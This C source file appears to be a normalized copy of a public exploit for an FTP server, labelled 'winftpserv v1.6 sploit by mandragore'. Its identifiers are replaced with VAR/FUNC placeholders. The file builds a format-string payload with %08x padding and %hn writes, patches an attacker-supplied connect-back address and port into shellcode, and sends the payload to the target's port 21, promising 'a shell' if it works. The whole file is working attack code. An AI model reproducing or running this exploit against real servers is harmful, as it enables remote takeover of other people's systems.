
typedef unsigned long size_t;
typedef long intptr_t; typedef unsigned long uintptr_t;
typedef long scalar_t__;

typedef int bool;




typedef struct TYPE_2__ TYPE_1__ ;


struct TYPE_2__ {int s_addr; } ;
struct sockaddr_in {int sin_port; TYPE_1__ sin_addr; int sin_family; } ;
struct sockaddr {int dummy; } ;
struct in_addr {int dummy; } ;
typedef int saddr ;


 int VAR_0 ;
 int VAR_1 ;
 int FUNC_0 (int ) ;
 int FUNC_1 (char*,int) ;
 int FUNC_2 (int) ;
 int FUNC_3 (int,struct sockaddr*,int) ;
 int FUNC_4 (int) ;
 int FUNC_5 (int,char**,char*) ;
 int FUNC_6 (int ) ;
 int FUNC_7 (int ) ;
 char* FUNC_8 (struct in_addr) ;
 scalar_t__ FUNC_9 (int) ;
 int FUNC_10 (char*,int*,int) ;
 int VAR_2 ;
 int FUNC_11 (char*) ;
 int VAR_3 ;
 int FUNC_12 (char*,...) ;
 int FUNC_13 (int,char*,int,int ) ;
 char* VAR_4 ;
 int FUNC_14 (int,char*,int ,int ) ;
 int FUNC_15 (int,int,int) ;
 int FUNC_16 (char*,char*,char*,int,int) ;
 int FUNC_17 (char*,char*) ;
 int FUNC_18 (char*) ;
 int FUNC_19 (char*,char*,int ) ;
 int FUNC_20 (char*) ;

int FUNC_21(int VAR_5, char **VAR_6) {
        struct sockaddr_in VAR_7;

        int VAR_8=0, VAR_9=0x0100007f;
        int VAR_10=80;
        int VAR_11=0x5f40382b;
        int VAR_12=0xc283, VAR_13=0xe2ff;
        int VAR_14=0x11eeca8-0x11ee96c;
        char *VAR_15;
        int VAR_16, VAR_17, VAR_18;

        FUNC_12("[%%] winftpserv v1.6 sploit by mandragore (v2)\n");

        if (VAR_5<2) {
                FUNC_20(VAR_6[0]);
        }

        while((VAR_18 = FUNC_5(VAR_5, VAR_6, "d:h:p:"))!= VAR_1) {
                switch (VAR_18) {
                case 'd':
                        VAR_8=FUNC_7(VAR_2);
                        break;
                case 'h':
                        VAR_9=FUNC_7(VAR_2);
                        break;
                case 'p':
                        VAR_10=FUNC_0(VAR_2);
                        break;
                default:
                        FUNC_20(VAR_6[0]);
                        break;
                }
        }

        if ((VAR_8==-1) || (VAR_9==-1))
                FUNC_20(VAR_6[0]);

        FUNC_12("[.] if working you'll have a shell on %s:%d .\n",FUNC_8(*(struct in_addr *)&VAR_9),VAR_10);
        FUNC_12("[.] launching attack on %s..\n",FUNC_8(*(struct in_addr *)&VAR_8));

        VAR_10=VAR_10 ^ 0x9696;
        VAR_10=(VAR_10 & 0xff) << 8 | VAR_10 >>8;
        FUNC_10(VAR_4+17+18+0x5a,&VAR_10,2);

        VAR_9=VAR_9 ^ 0x96969696;
        FUNC_10(VAR_4+17+18+0x53,&VAR_9,4);

        VAR_15=(char *)FUNC_9(4096);
        FUNC_1(VAR_15,4096);

        FUNC_10(VAR_15,&VAR_11,4);
        FUNC_17(VAR_15,"xyzy");
        VAR_11+=3;
        FUNC_10(VAR_15+8,&VAR_11,4);

        FUNC_19(VAR_15,VAR_4,FUNC_18(VAR_4));

        for (VAR_18=0;VAR_18<(VAR_14-1)/4;VAR_18++) {
                FUNC_17(VAR_15,"%08x");
        }

        FUNC_16(VAR_15,"%s%%0%dx%%hn%%0%dx%%hn\r\n",VAR_15,VAR_12-FUNC_18(VAR_4)-((VAR_14-1)/4)*8-4*3-7,VAR_13-VAR_12);

        VAR_7.sin_family = VAR_0;
        VAR_7.sin_addr.s_addr = VAR_8;
        VAR_7.sin_port = FUNC_6(21);

        VAR_16=FUNC_15(2,1,6);

        VAR_17=FUNC_3(VAR_16,(struct sockaddr *)&VAR_7, sizeof(VAR_7));
        if (VAR_17==-1) {
                FUNC_11("[-] connect()");
                FUNC_4(1);
        }

        FUNC_14(VAR_16,VAR_15,FUNC_18(VAR_15),0);

        FUNC_13(VAR_16,VAR_15,1024,0);

        FUNC_2(VAR_16);

        FUNC_12("[+] done.\n");

        FUNC_4(0);
}
